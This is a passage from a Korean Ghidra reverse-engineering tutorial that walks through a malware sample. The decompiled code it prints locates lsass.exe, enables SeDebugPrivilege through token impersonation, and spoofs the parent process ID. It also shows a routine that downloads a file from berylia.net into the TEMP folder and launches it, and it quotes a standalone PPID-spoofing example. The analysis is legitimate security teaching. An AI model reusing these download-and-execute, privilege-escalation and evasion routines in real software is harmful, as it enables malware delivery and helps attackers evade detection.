href="https://www.notion.so/3a72818cfd7e4c05aa3ca52a894ae0d6">app.any.run</a>에서 구할 수 있습니다.</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled.png"></p><p>Detect It Easy로 확인한 결과 저번과 동일하게 mingw gcc로 컴파일이 된 파일임을 알 수 있습니다.</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%201.png"></p><p>이번에는 저번과 달리 크게 눈에 띄는 문자열은 없지만, <code>wininet.dll</code>, <code>berylia.net</code>, <code>Wlsass.exe</code> 문자열을 보고 유추해볼 때, 해당 링크에 network 접속을 하여 <code>Wlsass.exe</code> 파일을 다운로드하는 것으로 추정할 수 있겠네요.</p><h1 id="Ghidra를-통한-기초-정적-분석"><a href="#Ghidra를-통한-기초-정적-분석" class="headerlink" title="Ghidra를 통한 기초 정적 분석"></a>Ghidra를 통한 기초 정적 분석</h1><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%202.png"></p><p>벌써 마지막 파트까지 도달했으니 이제 바이너리 정도는 가뿐하게 열고 analyze를 하실 수 있겠죠? ATAPIConfiguration을 추가해준 후 analyze까지 해줍니다.</p><pre><code class="hljs cpp"><span class="hljs-function">undefined4 <span class="hljs-title">FUN_00401cb7</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">bool</span> bVar1;  HMODULE pHVar2;  <span class="hljs-keyword">int</span> iVar3;  undefined3 extraout_var;  undefined4 uVar4;  HANDLE hHeap;  undefined4 local_2c4 [<span class="hljs-number">2</span>];  undefined4 local_2bc;  <span class="hljs-keyword">wchar_t</span> awStack672 [<span class="hljs-number">260</span>];  SIZE_T local_98;  undefined local_94 [<span class="hljs-number">16</span>];  undefined4 local_84 [<span class="hljs-number">17</span>];  LPVOID local_40;  <span class="hljs-keyword">int</span> local_3c [<span class="hljs-number">2</span>];  FARPROC local_34;  FARPROC local_30;  FARPROC local_2c;  FARPROC local_28;  DWORD local_24;  FARPROC local_20;  FARPROC local_1c;  <span class="hljs-keyword">int</span> local_18;  FARPROC local_14;  undefined4 local_10;    local_3c[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;  pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  local_14 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;CreateToolhelp32Snapshot&quot;</span>);  local_18 = (*local_14)(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);  local_2c4[<span class="hljs-number">0</span>] = <span class="hljs-number">0x22c</span>;  pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  local_1c = GetProcAddress(pHVar2,<span class="hljs-string">&quot;Process32FirstW&quot;</span>);  pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  local_20 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;Process32NextW&quot;</span>);  iVar3 = (*local_1c)(local_18,local_2c4);  <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;    local_24 = GetLastError();  &#125;  <span class="hljs-keyword">do</span> &#123;    iVar3 = wcscmp(awStack672,<span class="hljs-string">L&quot;lsass.exe&quot;</span>);    <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;      local_10 = local_2bc;    &#125;    iVar3 = (*local_20)(local_18,local_2c4);  &#125; <span class="hljs-keyword">while</span> (iVar3 != <span class="hljs-number">0</span>);  bVar1 = FUN_00401b91();  <span class="hljs-keyword">if</span> (CONCAT31(extraout_var,bVar1) == <span class="hljs-number">0</span>) &#123;    uVar4 = <span class="hljs-number">0</span>;  &#125;  <span class="hljs-keyword">else</span> &#123;    pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);    local_28 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;OpenProcess&quot;</span>);    local_3c[<span class="hljs-number">0</span>] = (*local_28)(<span class="hljs-number">0x1f0fff</span>,<span class="hljs-number">0</span>,local_10);    <span class="hljs-keyword">if</span> (local_3c[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>) &#123;      uVar4 = <span class="hljs-number">0</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;      <span class="hljs-built_in">memset</span>(local_84,<span class="hljs-number">0</span>,<span class="hljs-number">0x48</span>);      pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      local_2c = GetProcAddress(pHVar2,<span class="hljs-string">&quot;InitializeProcThreadAttributeList&quot;</span>);      pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      local_30 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;UpdateProcThreadAttribute&quot;</span>);      (*local_2c)(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,&amp;local_98);      hHeap = GetProcessHeap();      local_40 = HeapAlloc(hHeap,<span class="hljs-number">0</span>,local_98);      (*local_2c)(local_40,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,&amp;local_98);      (*local_30)(local_40,<span class="hljs-number">0</span>,<span class="hljs-number">0x20000</span>,local_3c,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);      local_84[<span class="hljs-number">0</span>] = <span class="hljs-number">0x48</span>;      pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      local_34 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;CreateProcessA&quot;</span>);      FUN_00401570();      iVar3 = (*local_34)(DAT_00416028,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x80010</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,local_84,local_94);      <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;        uVar4 = <span class="hljs-number">0</span>;      &#125;      <span class="hljs-keyword">else</span> &#123;        uVar4 = <span class="hljs-number">1</span>;      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> uVar4;&#125;</code></pre><p>이번 바이너리에서 중점적으로 분석할 부분은 <code>FUN_00401cb7</code>입니다. 역시… 처음 열었을 때는 보기가 상당히 불편하네요. 이 변수가 어떤 건지도 모르겠고~ 저번 시간과 같이 보기 편하게 정리해봅시다.</p><pre><code class="hljs cpp"><span class="hljs-function">undefined4 <span class="hljs-title">FUN_00401cb7</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">bool</span> bVar1;  HMODULE hModule;  WINBOOL WVar2;  <span class="hljs-keyword">int</span> iVar3;  undefined3 extraout_var;  undefined4 uVar4;  HANDLE hHeap;  PROCESSENTRY32W lppe;  SIZE_T local_98;  _PROCESS_INFORMATION local_94;  _STARTUPINFOA local_84;  LPPROC_THREAD_ATTRIBUTE_LIST local_40;  HANDLE proc_handle [<span class="hljs-number">2</span>];  CreateProcessA *CreateProcessA_addr;  UpdateProcThreadAttribute *UpdateProcThreadAttribute_addr;  InitializeProcThreadAttributeList *InitializeProcThreadAttributeList_addr;  OpenProcess *OpenProcess_addr;  DWORD local_24;  Process32NextW *Process32NextW_addr;  Process32FirstW *Process32FirstW_addr;  HANDLE hSnapshot;  CreateToolhelp32Snapshot *CreateToolhelp32Snapshot_addr;  DWORD pid;    proc_handle[<span class="hljs-number">0</span>] = (HANDLE)<span class="hljs-number">0x0</span>;  hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  CreateToolhelp32Snapshot_addr =       (CreateToolhelp32Snapshot *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateToolhelp32Snapshot&quot;</span>);  hSnapshot = (*CreateToolhelp32Snapshot_addr)(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);  lppe.dwSize = <span class="hljs-number">0x22c</span>;  hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  Process32FirstW_addr = (Process32FirstW *)GetProcAddress(hModule,<span class="hljs-string">&quot;Process32FirstW&quot;</span>);  hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  Process32NextW_addr = (Process32NextW *)GetProcAddress(hModule,<span class="hljs-string">&quot;Process32NextW&quot;</span>);  WVar2 = (*Process32FirstW_addr)(hSnapshot,(LPPROCESSENTRY32W)&amp;lppe);  <span class="hljs-keyword">if</span> (WVar2 == <span class="hljs-number">0</span>) &#123;    local_24 = GetLastError();  &#125;  <span class="hljs-keyword">do</span> &#123;    iVar3 = wcscmp(lppe.szExeFile,<span class="hljs-string">L&quot;lsass.exe&quot;</span>);    <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;      pid = lppe.th32ProcessID;    &#125;    WVar2 = (*Process32NextW_addr)(hSnapshot,(LPPROCESSENTRY32W)&amp;lppe);  &#125; <span class="hljs-keyword">while</span> (WVar2 != <span class="hljs-number">0</span>);  bVar1 = FUN_00401b91();  <span class="hljs-keyword">if</span> (CONCAT31(extraout_var,bVar1) == <span class="hljs-number">0</span>) &#123;    uVar4 = <span class="hljs-number">0</span>;  &#125;  <span class="hljs-keyword">else</span> &#123;    hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);    OpenProcess_addr = (OpenProcess *)GetProcAddress(hModule,<span class="hljs-string">&quot;OpenProcess&quot;</span>);    proc_handle[<span class="hljs-number">0</span>] = (*OpenProcess_addr)(<span class="hljs-number">0x1f0fff</span>,<span class="hljs-number">0</span>,pid);    <span class="hljs-keyword">if</span> (proc_handle[<span class="hljs-number">0</span>] == (HANDLE)<span class="hljs-number">0x0</span>) &#123;      uVar4 = <span class="hljs-number">0</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;      <span class="hljs-built_in">memset</span>(&amp;local_84,<span class="hljs-number">0</span>,<span class="hljs-number">0x48</span>);      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      InitializeProcThreadAttributeList_addr =           (InitializeProcThreadAttributeList *)           GetProcAddress(hModule,<span class="hljs-string">&quot;InitializeProcThreadAttributeList&quot;</span>);      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      UpdateProcThreadAttribute_addr =           (UpdateProcThreadAttribute *)GetProcAddress(hModule,<span class="hljs-string">&quot;UpdateProcThreadAttribute&quot;</span>);      (*InitializeProcThreadAttributeList_addr)((LPPROC_THREAD_ATTRIBUTE_LIST)<span class="hljs-number">0x0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,&amp;local_98);      hHeap = GetProcessHeap();      local_40 = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(hHeap,<span class="hljs-number">0</span>,local_98);      (*InitializeProcThreadAttributeList_addr)(local_40,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,&amp;local_98);      (*UpdateProcThreadAttribute_addr)(local_40,<span class="hljs-number">0</span>,<span class="hljs-number">0x20000</span>,proc_handle,<span class="hljs-number">4</span>,(PVOID)<span class="hljs-number">0x0</span>,(PSIZE_T)<span class="hljs-number">0x0</span>);      local_84.cb = <span class="hljs-number">0x48</span>;      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      CreateProcessA_addr = (CreateProcessA *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateProcessA&quot;</span>);      FUN_00401570();      WVar2 = (*CreateProcessA_addr)                        (DAT_00416028,(LPSTR)<span class="hljs-number">0x0</span>,(LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,                         (LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x80010</span>,(LPVOID)<span class="hljs-number">0x0</span>,(LPCSTR)<span class="hljs-number">0x0</span>,                         (LPSTARTUPINFOA)&amp;local_84,(LPPROCESS_INFORMATION)&amp;local_94);      <span class="hljs-keyword">if</span> (WVar2 == <span class="hljs-number">0</span>) &#123;        uVar4 = <span class="hljs-number">0</span>;      &#125;      <span class="hljs-keyword">else</span> &#123;        uVar4 = <span class="hljs-number">1</span>;      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> uVar4;&#125;</code></pre><p>보기가 좀 편해진 거 같은 느낌이 듭니다. 전체적인 부분을 훑어봤을 때 프로세스를 탐색을 하며 <code>lsass.exe</code>와 비교하고 같을 시 해당 프로세스의 ID를 가져옵니다. 그 후 <code>FUN_00401b91</code>을 호출하네요. 그 후 가져온 <code>lsass.exe</code>의 프로세스 핸들을 열고 <code>IntitializeProcThreaddAttributeList</code>, <code>UpdateProcThreadAttribute</code> 등을 호출하는 걸 보아… <a href="https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing">PPID Spoofing</a>을 진행하는 거 같습니다. 해당 링크에서 확인할 수 있는 <code>ppid-spoofing.cpp</code> 코드와 비교해볼까요?</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;TlHelp32.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span><span class="hljs-function"></span>&#123;STARTUPINFOEXA si;PROCESS_INFORMATION pi;SIZE_T attributeSize;ZeroMemory(&amp;si, <span class="hljs-keyword">sizeof</span>(STARTUPINFOEXA));HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, <span class="hljs-literal">false</span>, <span class="hljs-number">6200</span>);InitializeProcThreadAttributeList(<span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;attributeSize);si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), <span class="hljs-number">0</span>, attributeSize);InitializeProcThreadAttributeList(si.lpAttributeList, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;attributeSize);UpdateProcThreadAttribute(si.lpAttributeList, <span class="hljs-number">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;parentProcessHandle, <span class="hljs-keyword">sizeof</span>(HANDLE), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);si.StartupInfo.cb = <span class="hljs-keyword">sizeof</span>(STARTUPINFOEXA);CreateProcessA(<span class="hljs-literal">NULL</span>, (LPSTR)<span class="hljs-string">&quot;notepad&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, EXTENDED_STARTUPINFO_PRESENT, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si.StartupInfo, &amp;pi);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>사용하는 함수, 파라미터가 동일한 것을 확인하실 수 있어요. 그럼 이 행위를 왜 하느냐?</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%203.png"></p><p>당연히 탐지를 피하기 위해서! PPID Spoofing을 하면 해당 프로세스가 <code>lsass.exe</code>에 의해서 생성된 것으로 보이도록 하므로 탐지를 피할 수 있습니다. (물론 탐지 방법도 존재하지만요.)</p><pre><code class="hljs cpp">CreateProcessA_addr = (CreateProcessA *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateProcessA&quot;</span>);      FUN_00401570();      WVar2 = (*CreateProcessA_addr)                        (DAT_00416028,(LPSTR)<span class="hljs-number">0x0</span>,(LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,                         (LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x80010</span>,(LPVOID)<span class="hljs-number">0x0</span>,(LPCSTR)<span class="hljs-number">0x0</span>,                         (LPSTARTUPINFOA)&amp;local_84,(LPPROCESS_INFORMATION)&amp;local_94);</code></pre><p>PPID Spoofing을 진행한 후, 밑에 코드를 확인하면 <code>FUN_00401570</code>을 호출한 후 <code>CreateProcess</code>를 통해 프로세스를 실행하는 것을 볼 수 있습니다.</p><p>정리하자면 해당 함수는 <code>lsass.exe</code>의 PID를 가져오고 <code>FUN_00401b91</code>을 호출한 후 PPID Spoofing을 진행한 뒤 <code>FUN_00401570</code>을 호출합니다. 그 후 <code>CreateProcessA</code>를 통해 추가적인 프로세스를 실행하네요.</p><p>근데 아까 위에서 확인했던 주소와 <code>Wlsass.exe</code>가 아직 나타나지 않았습니다. 음… 다운로드 기능이 추가되어있을 것 같은데? <code>FUN_00401b91</code>을 먼저 확인하면서 어떠한 행위를 하는지 확인해보죠!</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">token_priv_escalate</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  HANDLE thread_handle;  WINBOOL WVar1;  DWORD DVar2;  <span class="hljs-keyword">int</span> iVar3;  HANDLE token_handle;  ImpersonateSelf *ImpersonateSelf_addr;  OpenThreadToken *OpenThreadToken_addr;    OpenThreadToken_addr = (OpenThreadToken *)GetProcAddress(DAT_0041601c,<span class="hljs-string">&quot;OpenThreadToken&quot;</span>);  thread_handle = GetCurrentThread();  WVar1 = (*OpenThreadToken_addr)(thread_handle,<span class="hljs-number">0x28</span>,<span class="hljs-number">0</span>,&amp;token_handle);  <span class="hljs-keyword">if</span> (WVar1 == <span class="hljs-number">0</span>) &#123;    DVar2 = GetLastError();    <span class="hljs-keyword">if</span> (DVar2 != <span class="hljs-number">0x3f0</span>) &#123;      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    ImpersonateSelf_addr = (ImpersonateSelf *)GetProcAddress(DAT_0041601c,<span class="hljs-string">&quot;ImpersonateSelf&quot;</span>);    WVar1 = (*ImpersonateSelf_addr)(SecurityImpersonation);    <span class="hljs-keyword">if</span> (WVar1 == <span class="hljs-number">0</span>) &#123;      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    thread_handle = GetCurrentThread();    WVar1 = (*OpenThreadToken_addr)(thread_handle,<span class="hljs-number">0x28</span>,<span class="hljs-number">0</span>,&amp;token_handle);    <span class="hljs-keyword">if</span> (WVar1 == <span class="hljs-number">0</span>) &#123;      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;  &#125;  iVar3 = FUN_00401a9e(token_handle,<span class="hljs-string">L&quot;SeDebugPrivilege&quot;</span>);  <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;    CloseHandle(token_handle);  &#125;  <span class="hljs-keyword">return</span> iVar3 != <span class="hljs-number">0</span>;&#125;</code></pre><p>스레드 토큰을 가져오고, Impersonation을 하고… 가장 결정적으로 <code>SeDebugPrivilege</code>를 호출합니다. Privilege 단어만 봐도 짐작이 되는군요. 흠흠… 해당 Token Privilege Escalation 인 것 같습니다! SeDebugPrivilege escalation 등으로 구글링을 해보면</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%204.png"></p><p><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens</a></p><p>토큰을 통해 권한 상승을 하는 방법에 대해서 나와 있습니다. 밑으로 내려보면?</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%205.png"></p><p><code>SeDebugPrivilege</code>가 존재합니다.</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%206.png"></p><p><code>FUN_00401a9e</code>를 확인해보면 <code>AdjustTokenPrivileges</code>를 통해 액세스 토큰에 대한 권한을 설정하는 걸 확인할 수 있습니다. 그러면 <code>FUN_00401b91</code> 부분은 Token Privilege escalation을 하는 부분이네요. 그럼 다음 분석해야 할 부분인 <code>FUN_00401570</code>을 확인해볼까요?</p><pre><code class="hljs cpp"><span class="hljs-function">undefined4 <span class="hljs-title">FUN_00401570</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">char</span> cVar1;  <span class="hljs-keyword">bool</span> bVar2;  undefined4 uVar3;  HMODULE hModule;  WINBOOL WVar4;  <span class="hljs-keyword">size_t</span> temp_path_len;  undefined4 *puVar5;  uint uVar6;  <span class="hljs-keyword">char</span> *pcVar7;  DWORD local_60;  DWORD local_5c;  DWORD local_58;  uint local_54;  InternetCloseHandle *InternetCloseHandle_addr;  WriteFile *WriteFile_addr;  InternetReadFile *InternetReadFile_addr;  HANDLE local_44;  CreateFileW *CreateFileW_addr;  <span class="hljs-keyword">char</span> *temp_path;  <span class="hljs-keyword">void</span> *local_38;  WINBOOL local_34;  HttpSendRequestA *HttpSendRequestA_addr;  InternetSetOptionW *InternetSetOptionW_addr;  InternetQueryOptionW *InternetQueryOptionW_addr;  HINTERNET local_24;  HttpOpenRequestW *HttpOpenRequestW_addr;  HINTERNET local_1c;  InternetConnectW *InternetConnectW_addr;  HINTERNET local_14;  InternetOpenW *InternetOpenW_addr;    InternetOpenW_addr = (InternetOpenW *)GetProcAddress(DAT_00416020,<span class="hljs-string">&quot;InternetOpenW&quot;</span>);  local_14 = (*InternetOpenW_addr)(<span class="hljs-string">L&quot;WINDOWS&quot;</span>,<span class="hljs-number">0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,<span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (local_14 == (HINTERNET)<span class="hljs-number">0x0</span>) &#123;    uVar3 = <span class="hljs-number">0xe</span>;  &#125;  <span class="hljs-keyword">else</span> &#123;    hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);    InternetConnectW_addr = (InternetConnectW *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetConnectW&quot;</span>);    local_1c = (*InternetConnectW_addr)                         (local_14,<span class="hljs-string">L&quot;berylia.net&quot;</span>,<span class="hljs-number">0x1bb</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span> (local_1c == (HINTERNET)<span class="hljs-number">0x0</span>) &#123;      uVar3 = <span class="hljs-number">0xe</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);      HttpOpenRequestW_addr = (HttpOpenRequestW *)GetProcAddress(hModule,<span class="hljs-string">&quot;HttpOpenRequestW&quot;</span>);      local_24 = (*HttpOpenRequestW_addr)                           (local_1c,<span class="hljs-string">L&quot;GET&quot;</span>,<span class="hljs-string">L&quot;/index/&quot;</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR *)<span class="hljs-number">0x0</span>,                            <span class="hljs-number">0x800000</span>,<span class="hljs-number">1</span>);      <span class="hljs-keyword">if</span> (local_24 == (HINTERNET)<span class="hljs-number">0x0</span>) &#123;        uVar3 = <span class="hljs-number">0xe</span>;      &#125;      <span class="hljs-keyword">else</span> &#123;        local_58 = <span class="hljs-number">4</span>;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        InternetQueryOptionW_addr =             (InternetQueryOptionW *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetQueryOptionW&quot;</span>);        WVar4 = (*InternetQueryOptionW_addr)(local_24,<span class="hljs-number">0x1f</span>,&amp;local_54,&amp;local_58);        <span class="hljs-keyword">if</span> (WVar4 != <span class="hljs-number">0</span>) &#123;          hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          InternetSetOptionW_addr =               (InternetSetOptionW *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetSetOptionW&quot;</span>);          local_54 = local_54 | <span class="hljs-number">0x1180</span>;          (*InternetSetOptionW_addr)(local_24,<span class="hljs-number">0x1f</span>,&amp;local_54,<span class="hljs-number">4</span>);        &#125;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        HttpSendRequestA_addr = (HttpSendRequestA *)GetProcAddress(hModule,<span class="hljs-string">&quot;HttpSendRequestA&quot;</span>);        local_34 = (*HttpSendRequestA_addr)(local_24,(LPCSTR)<span class="hljs-number">0x0</span>,<span class="hljs-number">0</span>,(LPVOID)<span class="hljs-number">0x0</span>,<span class="hljs-number">0</span>);        local_38 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(local_38,<span class="hljs-number">0</span>,<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(DAT_00416024,<span class="hljs-number">0</span>,<span class="hljs-number">0x1000</span>);        temp_path = getenv(<span class="hljs-string">&quot;TEMP&quot;</span>);        temp_path_len = <span class="hljs-built_in">strlen</span>(temp_path);        DAT_00416028 = (LPCSTR)<span class="hljs-built_in">malloc</span>(temp_path_len + <span class="hljs-number">0x1000</span>);        <span class="hljs-built_in">strcpy</span>(DAT_00416028,temp_path);        uVar6 = <span class="hljs-number">0xffffffff</span>;        pcVar7 = DAT_00416028;        <span class="hljs-keyword">do</span> &#123;          <span class="hljs-keyword">if</span> (uVar6 == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;          uVar6 = uVar6 - <span class="hljs-number">1</span>;          cVar1 = *pcVar7;          pcVar7 = pcVar7 + <span class="hljs-number">1</span>;        &#125; <span class="hljs-keyword">while</span> (cVar1 != <span class="hljs-string">&#x27;\0&#x27;</span>);        puVar5 = (undefined4 *)(DAT_00416028 + (~uVar6 - <span class="hljs-number">1</span>));        *puVar5 = <span class="hljs-number">0x4154415c</span>;        puVar5[<span class="hljs-number">1</span>] = <span class="hljs-number">0x70554950</span>;        puVar5[<span class="hljs-number">2</span>] = <span class="hljs-number">0x2e727464</span>;        puVar5[<span class="hljs-number">3</span>] = <span class="hljs-number">0x657865</span>;        MultiByteToWideChar(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,DAT_00416028,<span class="hljs-number">-1</span>,DAT_00416024,<span class="hljs-number">0x1000</span>);        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        CreateFileW_addr = (CreateFileW *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateFileW&quot;</span>);        local_44 = (*CreateFileW_addr)(DAT_00416024,<span class="hljs-number">0xc0000000</span>,<span class="hljs-number">0</span>,(LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x80</span>,                                       (HANDLE)<span class="hljs-number">0x0</span>);        local_5c = <span class="hljs-number">0</span>;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        InternetReadFile_addr = (InternetReadFile *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetReadFile&quot;</span>);        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        WriteFile_addr = (WriteFile *)GetProcAddress(hModule,<span class="hljs-string">&quot;WriteFile&quot;</span>);        <span class="hljs-keyword">if</span> (local_34 == <span class="hljs-number">0</span>) &#123;          uVar3 = <span class="hljs-number">0xe</span>;        &#125;        <span class="hljs-keyword">else</span> &#123;          local_60 = <span class="hljs-number">0</span>;          <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;            WVar4 = (*InternetReadFile_addr)(local_24,local_38,<span class="hljs-number">0x2000</span>,&amp;local_60);            <span class="hljs-keyword">if</span> ((WVar4 == <span class="hljs-number">0</span>) || (local_60 == <span class="hljs-number">0</span>)) &#123;              bVar2 = <span class="hljs-literal">false</span>;            &#125;            <span class="hljs-keyword">else</span> &#123;              bVar2 = <span class="hljs-literal">true</span>;            &#125;            <span class="hljs-keyword">if</span> (!bVar2) <span class="hljs-keyword">break</span>;            (*WriteFile_addr)(local_44,local_38,local_60,&amp;local_5c,(LPOVERLAPPED)<span class="hljs-number">0x0</span>);          &#125;          hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          InternetCloseHandle_addr =               (InternetCloseHandle *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetCloseHandle&quot;</span>);          CloseHandle(local_44);          (*InternetCloseHandle_addr)(local_14);          (*InternetCloseHandle_addr)(local_1c);          (*InternetCloseHandle_addr)(local_24);          uVar3 = <span class="hljs-number">1</span>;        &#125;      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> uVar3;&#125;</code></pre><p>상당히 기네요… 나눠서 살펴보아야 할 것 같습니다. 중요한 부분만 뽑아내서 살펴보도록 합시다.</p><pre><code class="hljs cpp">InternetConnectW_addr = (InternetConnectW *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetConnectW&quot;</span>);local_1c = (*InternetConnectW_addr)           (local_14,<span class="hljs-string">L&quot;berylia.net&quot;</span>,<span class="hljs-number">0x1bb</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span 